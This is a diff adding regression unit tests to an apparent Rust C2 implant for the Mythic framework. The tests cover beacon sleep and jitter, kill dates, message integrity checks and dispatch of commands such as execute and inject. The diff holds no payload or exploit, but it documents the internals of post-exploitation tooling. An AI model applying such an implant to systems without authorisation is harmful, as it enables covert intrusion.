@@ -1096,6 +1096,7 @@ pub fn run_c2_loop<F>(
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::dispatch::dispatch_common;
 
     fn test_key() -> [u8; 32] {
         use sha2::{Digest, Sha256};
@@ -1155,5 +1156,472 @@ mod tests {
         use base64::{engine::general_purpose::STANDARD, Engine as _};
         let short = STANDARD.encode([0u8; 16]);
         assert!(decode_aes_key(&short).is_none());
+    }
+
+    // ── Regression: extract_param (QUAL-05, BUG-04) ──────────────────────────
+    //
+    // QUAL-05: extract_param previously returned the raw JSON blob when the key
+    // was absent, causing silent downstream errors (raw JSON passed as a file
+    // path, a sleep duration, etc.). It must now return "".
+    //
+    // BUG-04: Go ↔ Rust parameter mismatch. sleep/inject sent a single "args"
+    // string while Rust looked up "seconds"/"pid". extract_param is the bridge
+    // between Mythic's JSON parameters and the handlers, so its contract must
+    // be rock-solid.
+
+    #[test]
+    fn test_extract_param_string_value() {
+        assert_eq!(extract_param(r#"{"path": "/tmp"}"#, "path"), "/tmp");
+    }
+
+    #[test]
+    fn test_extract_param_number_value() {
+        // Mythic serializes numbers as JSON floats (see Phase 17.3).
+        assert_eq!(extract_param(r#"{"seconds": 30}"#, "seconds"), "30");
+        assert_eq!(extract_param(r#"{"seconds": 30.0}"#, "seconds"), "30.0");
+    }
+
+    #[test]
+    fn test_extract_param_missing_key_returns_empty() {
+        // QUAL-05: must return "" (not the raw JSON).
+        assert_eq!(extract_param(r#"{"other": "/tmp"}"#, "path"), "");
+    }
+
+    #[test]
+    fn test_extract_param_invalid_json_returns_empty() {
+        // Non-JSON input (e.g. a plain "30 10" string from a CLI parse path).
+        // The docstring claims a fallback to the raw string; the actual fixed
+        // behaviour returns "" (QUAL-05). Pin the real behaviour.
+        assert_eq!(extract_param("not json at all", "path"), "");
+        assert_eq!(extract_param("30 10", "seconds"), "");
+    }
+
+    #[test]
+    fn test_extract_param_empty_input() {
+        assert_eq!(extract_param("", "path"), "");
+    }
+
+    // ── Regression: handle_sleep_command (RS-02, QUAL-04) ────────────────────
+    //
+    // RS-02: handle_sleep_command panicked on whitespace-only input because
+    // parts[0] was accessed on an empty Vec. split_whitespace().collect() now
+    // yields an empty Vec and the early-return guard handles it.
+    //
+    // QUAL-04: sleep used float math with precision/edge-case issues; it now
+    // parses as f64 then casts. Pin the observable behaviour.
+
+    fn reset_sleep_state() {
+        set_sleep_seconds(5);
+        set_jitter_percent(0);
+    }
+
+    #[test]
+    fn test_sleep_whitespace_only_does_not_panic() {
+        // RS-02 regression guard.
+        reset_sleep_state();
+        let out = handle_sleep_command("   ");
+        assert!(out.starts_with("sleep:"), "whitespace-only: {}", out);
+        assert_eq!(get_sleep_seconds(), 5);
+        assert_eq!(get_jitter_percent(), 0);
+    }
+
+    #[test]
+    fn test_sleep_empty_input_shows_status() {
+        reset_sleep_state();
+        let out = handle_sleep_command("");
+        assert!(out.starts_with("sleep:"));
+    }
+
+    #[test]
+    fn test_sleep_sets_seconds_and_jitter() {
+        reset_sleep_state();
+        let out = handle_sleep_command("30 10");
+        assert_eq!(get_sleep_seconds(), 30);
+        assert_eq!(get_jitter_percent(), 10);
+        assert!(out.starts_with("[+]"));
+    }
+
+    #[test]
+    fn test_sleep_seconds_only() {
+        reset_sleep_state();
+        handle_sleep_command("42");
+        assert_eq!(get_sleep_seconds(), 42);
+        assert_eq!(get_jitter_percent(), 0);
+    }
+
+    #[test]
+    fn test_sleep_negative_seconds_saturates_to_zero() {
+        // QUAL-04: f64::parse("-5") succeeds, `as u64` saturates negatives to 0.
+        // Document the pinned behaviour so a future "fix" to reject negatives is
+        // a deliberate, test-updating decision rather than a silent change.
+        reset_sleep_state();
+        handle_sleep_command("-5");
+        assert_eq!(get_sleep_seconds(), 0);
+    }
+
+    #[test]
+    fn test_sleep_non_numeric_returns_usage() {
+        reset_sleep_state();
+        let out = handle_sleep_command("abc");
+        assert!(out.starts_with("[-]"));
+        // State unchanged.
+        assert_eq!(get_sleep_seconds(), 5);
+    }
+
+    #[test]
+    fn test_sleep_invalid_jitter_keeps_seconds() {
+        reset_sleep_state();
+        // Valid seconds, junk jitter: seconds set, jitter unchanged.
+        handle_sleep_command("20 notanumber");
+        assert_eq!(get_sleep_seconds(), 20);
+        assert_eq!(get_jitter_percent(), 0);
+    }
+
+    #[test]
+    fn test_sleep_jitter_clamped_to_100() {
+        reset_sleep_state();
+        handle_sleep_command("10 150");
+        assert_eq!(get_jitter_percent(), 100);
+    }
+
+    // ── Regression: handle_killdate_command ─────────────────────────────────
+
+    #[test]
+    fn test_killdate_empty_shows_unset() {
+        set_kill_date(None);
+        let out = handle_killdate_command("");
+        assert_eq!(out, "no killdate set");
+    }
+
+    #[test]
+    fn test_killdate_set_and_clear() {
+        set_kill_date(None);
+        let out = handle_killdate_command("1700000000");
+        assert_eq!(out, "[+] killdate: 1700000000");
+        assert_eq!(get_kill_date(), Some(1700000000));
+
+        let out = handle_killdate_command("clear");
+        assert_eq!(out, "[+] killdate cleared");
+        assert_eq!(get_kill_date(), None);
+    }
+
+    #[test]
+    fn test_killdate_clear_case_insensitive() {
+        set_kill_date(Some(123));
+        handle_killdate_command("CLEAR");
+        assert_eq!(get_kill_date(), None);
+    }
+
+    #[test]
+    fn test_killdate_invalid_returns_usage() {
+        set_kill_date(None);
+        let out = handle_killdate_command("not-a-timestamp");
+        assert!(out.starts_with("[-]"));
+        assert_eq!(get_kill_date(), None);
+    }
+
+    #[test]
+    fn test_killdate_shows_current_when_set() {
+        set_kill_date(Some(9999999999));
+        let out = handle_killdate_command("");
+        assert_eq!(out, "killdate: 9999999999");
+        set_kill_date(None);
+    }
+
+    // ── Regression: should_exit (kill date enforcement) ─────────────────────
+    //
+    // Documents the pre-epoch / corrupted-clock edge case: if the system clock
+    // is before UNIX_EPOCH, duration_since errors and should_exit returns false
+    // (kill date silently bypassed). Pin this so the behaviour is explicit.
+
+    #[test]
+    fn test_should_exit_no_killdate() {
+        set_kill_date(None);
+        assert!(!should_exit());
+    }
+
+    #[test]
+    fn test_should_exit_future_killdate_not_expired() {
+        // Far-future timestamp: not expired.
+        set_kill_date(Some(i64::MAX));
+        assert!(!should_exit());
+        set_kill_date(None);
+    }
+
+    #[test]
+    fn test_should_exit_past_killdate_expired() {
+        // Timestamp in the past relative to any modern clock: expired.
+        set_kill_date(Some(1));
+        assert!(should_exit());
+        set_kill_date(None);
+    }
+
+    // ── Regression: parse_mythic_message malformed input (GO-01) ────────────
+    //
+    // GO-01: encryptCallback previously returned plaintext on crypto failure.
+    // The parse side must reject malformed/short/tampered blobs rather than
+    // returning garbage. These guards prevent the implant from acting on a
+    // forged or truncated server response.
+
+    #[test]
+    fn test_parse_mythic_message_too_short() {
+        let key = test_key();
+        // Well below the minimum (UUID 36 + IV 16 + 1 block 16 + HMAC 32 = 100).
+        assert!(parse_mythic_message("aGVsbG8=", &key).is_none());
+        assert!(parse_mythic_message("", &key).is_none());
+    }
+
+    #[test]
+    fn test_parse_mythic_message_invalid_base64() {
+        let key = test_key();
+        assert!(parse_mythic_message("!!!not base64!!!", &key).is_none());
+    }
+
+    #[test]
+    fn test_parse_mythic_message_tampered_ciphertext() {
+        let key = test_key();
+        let uuid = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
+        let wire = build_mythic_message(uuid, "payload", &key);
+
+        // Flip a byte in the base64-decoded blob: must fail HMAC verification.
+        use base64::{engine::general_purpose::STANDARD, Engine as _};
+        let mut blob = STANDARD.decode(&wire).unwrap();
+        // Flip a ciphertext byte (offset 36 + 16 to land past the IV).
+        let idx = 52.min(blob.len().saturating_sub(1));
+        blob[idx] ^= 0xFF;
+        let tampered = STANDARD.encode(&blob);
+        assert!(parse_mythic_message(&tampered, &key).is_none());
+    }
+
+    #[test]
+    fn test_parse_mythic_message_truncated_hmac() {
+        let key = test_key();
+        let uuid = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
+        let wire = build_mythic_message(uuid, "payload", &key);
+
+        // Drop the last 10 bytes of base64 → truncates the HMAC.
+        let truncated = &wire[..wire.len() - 10];
+        assert!(parse_mythic_message(truncated, &key).is_none());
+    }
+
+    // ── Regression: decrypt_config malformed input ──────────────────────────
+
+    #[test]
+    fn test_decrypt_config_invalid_hex() {
+        let key = test_key();
+        assert!(decrypt_config("not-hex!@#$", &key).is_none());
+    }
+
+    #[test]
+    fn test_decrypt_config_too_short() {
+        let key = test_key();
+        // 32 hex chars = 16 bytes, below the IV(16)+block(16)+HMAC(32) minimum.
+        assert!(decrypt_config("00112233445566778899aabbccddeeff", &key).is_none());
+    }
+
+    #[test]
+    fn test_decrypt_config_wrong_key() {
+        let key = test_key();
+        let mut wrong = [0u8; 32];
+        wrong[0] = 0xFF;
+        let enc = encrypt_config("10.0.0.1:443", &key);
+        assert!(decrypt_config(&enc, &wrong).is_none());
+    }
+
+    // ── Regression: split_first (used by inject parsing) ────────────────────
+
+    #[test]
+    fn test_split_first_two_parts() {
+        let (cmd, args) = split_first("inject 1234 base64data");
+        assert_eq!(cmd, "inject");
+        assert_eq!(args, "1234 base64data");
+    }
+
+    #[test]
+    fn test_split_first_extra_spaces_collapsed() {
+        let (cmd, args) = split_first("inject    1234   data");
+        assert_eq!(cmd, "inject");
+        assert_eq!(args, "1234   data");
+    }
+
+    #[test]
+    fn test_split_first_no_space() {
+        let (cmd, args) = split_first("onlycommand");
+        assert_eq!(cmd, "onlycommand");
+        assert_eq!(args, "");
+    }
+
+    #[test]
+    fn test_split_first_empty() {
+        let (cmd, args) = split_first("");
+        assert_eq!(cmd, "");
+        assert_eq!(args, "");
+    }
+
+    // ── Regression: sleep_with_jitter edge cases (QUAL-04) ─────────────────
+    //
+    // These exercise the bounds without asserting on the random jitter value,
+    // which is non-deterministic. We assert the function does not panic and
+    // returns promptly for degenerate inputs.
+
+    #[test]
+    fn test_sleep_with_jitter_zero_base() {
+        // base=0 short-circuits to sleep(0); must not divide by zero or panic.
+        sleep_with_jitter(0, 50);
+    }
+
+    #[test]
+    fn test_sleep_with_jitter_zero_jitter() {
+        sleep_with_jitter(0, 0);
+    }
+
+    #[test]
+    fn test_sleep_with_jitter_range_zero_when_base_small() {
+        // base=1, jitter=1 → range = 1*1/100 = 0 → short-circuit to sleep(base).
+        sleep_with_jitter(1, 1);
+    }
+
+    #[test]
+    fn test_sleep_with_jitter_typical() {
+        sleep_with_jitter(1, 23);
+    }
+
+    #[test]
+    fn test_sleep_with_jitter_full_100_percent() {
+        sleep_with_jitter(1, 100);
+    }
+
+    // ── Regression: expand_tilde ─────────────────────────────────────────────
+
+    #[test]
+    fn test_expand_tilde_plain_path_unchanged() {
+        assert_eq!(expand_tilde("/tmp/foo"), "/tmp/foo");
+        assert_eq!(expand_tilde("relative/path"), "relative/path");
+    }
+
+    #[test]
+    fn test_expand_tilde_no_home_env_does_not_crash() {
+        // We cannot reliably control $HOME in a unit test, but we can at least
+        // confirm a non-tilde path is returned verbatim regardless of env.
+        assert_eq!(expand_tilde("/etc/hostname"), "/etc/hostname");
+    }
+
+    // ── Regression: dispatch_common parameter extraction (BUG-08, BUG-12) ──
+    //
+    // BUG-08: dispatch was inconsistent across platforms (Linux used
+    // extract_param directly, Windows/OSX went through a string re-parse that
+    // lost JSON structure). dispatch_common now consumes (command, parameters)
+    // and uses extract_param uniformly.
+    //
+    // BUG-12: shell/cmd/powershell dispatchers passed raw JSON to the shell.
+    // The fix uses extract_param("command"). These tests verify dispatch_common
+    // honours JSON parameters for the cross-platform commands it owns.
+
+    #[test]
+    fn test_dispatch_common_unknown_command_returns_none() {
+        // Unknown commands must return None so platform code can handle them,
+        // not silently fall through to shell execution.
+        assert!(dispatch_common("totally_unknown_cmd", "{}").is_none());
+        assert!(dispatch_common("totally_unknown_cmd", "").is_none());
+    }
+
+    #[test]
+    fn test_dispatch_common_sleep_via_json_params() {
+        // BUG-04 / BUG-08 regression: sleep must accept JSON {seconds, jitter}.
+        reset_sleep_state();
+        let out = dispatch_common("sleep", r#"{"seconds": 42, "jitter": 7}"#);
+        let out = out.expect("sleep handled by dispatch_common");
+        assert!(out.text.starts_with("[+]"));
+        assert_eq!(get_sleep_seconds(), 42);
+        assert_eq!(get_jitter_percent(), 7);
+        reset_sleep_state();
+    }
+
+    #[test]
+    fn test_dispatch_common_sleep_json_missing_jitter() {
+        reset_sleep_state();
+        let out = dispatch_common("sleep", r#"{"seconds": 42}"#);
+        let out = out.expect("sleep handled");
+        assert!(out.text.starts_with("[+]"));
+        assert_eq!(get_sleep_seconds(), 42);
+        // Jitter absent → extract_param returns "" → handle_sleep_command
+        // gets "42 " which split_whitespace reduces to ["42"], jitter stays 0.
+        assert_eq!(get_jitter_percent(), 0);
+        reset_sleep_state();
+    }
+
+    #[test]
+    fn test_dispatch_common_killdate_via_json() {
+        set_kill_date(None);
+        let out = dispatch_common("killdate", r#"{"date": "1700000000"}"#);
+        let out = out.expect("killdate handled");
+        assert!(out.text.starts_with("[+]"));
+        assert_eq!(get_kill_date(), Some(1700000000));
+        set_kill_date(None);
+    }
+
+    #[test]
+    fn test_dispatch_common_pwd() {
+        let out = dispatch_common("pwd", "").expect("pwd handled");
+        // Should be the current dir (non-empty) or an error message, but not a
+        // panic and not the raw JSON.
+        assert!(!out.text.is_empty());
+    }
+
+    #[test]
+    fn test_dispatch_common_pid() {
+        let out = dispatch_common("pid", "{}").expect("pid handled");
+        assert_eq!(out.text, std::process::id().to_string());
+    }
+
+    #[test]
+    fn test_dispatch_common_cp_missing_args_returns_usage_error() {
+        // No "source"/"destination" keys → extract_param returns "" → usage error.
+        let out = dispatch_common("cp", "{}").expect("cp handled");
+        assert!(out.text.starts_with("[-]"));
+    }
+
+    #[test]
+    fn test_dispatch_common_mv_missing_args_returns_usage_error() {
+        let out = dispatch_common("mv", r#"{"source": "/tmp/a"}"#).expect("mv handled");
+        assert!(out.text.starts_with("[-]"));
+    }
+
+    #[test]
+    fn test_dispatch_common_rm_missing_path_returns_usage_error() {
+        let out = dispatch_common("rm", "{}").expect("rm handled");
+        assert!(out.text.starts_with("[-]"));
+    }
+
+    #[test]
+    fn test_dispatch_common_mkdir_missing_path_returns_usage_error() {
+        let out = dispatch_common("mkdir", "{}").expect("mkdir handled");
+        assert!(out.text.starts_with("[-]"));
+    }
+
+    #[test]
+    fn test_dispatch_common_execute_missing_command_returns_usage_error() {
+        // No "command" key → extract_param returns "" → falls back to raw params
+        // "{}" which split_whitespace reduces to empty → usage error.
+        let out = dispatch_common("execute", "{}").expect("execute handled");
+        assert!(out.text.starts_with("[-]"));
+    }
+
+    #[test]
+    fn test_dispatch_common_cd_to_home_on_empty_path() {
+        // Empty path → target defaults to "~" → expand_tilde. Whether it
+        // succeeds depends on $HOME; we only assert it does not panic and
+        // returns a non-empty result.
+        let out = dispatch_common("cd", "{}").expect("cd handled");
+        assert!(!out.text.is_empty());
+    }
+
+    #[test]
+    fn test_dispatch_common_ls_empty_path_lists_cwd() {
+        // Empty path → list_dir_browser(".") → should not error on cwd.
+        let out = dispatch_common("ls", "{}").expect("ls handled");
+        // Either a listing or an error message, but must not panic and must
+        // populate the file_browser field.
+        assert!(out.file_browser.is_some());
     }
 }
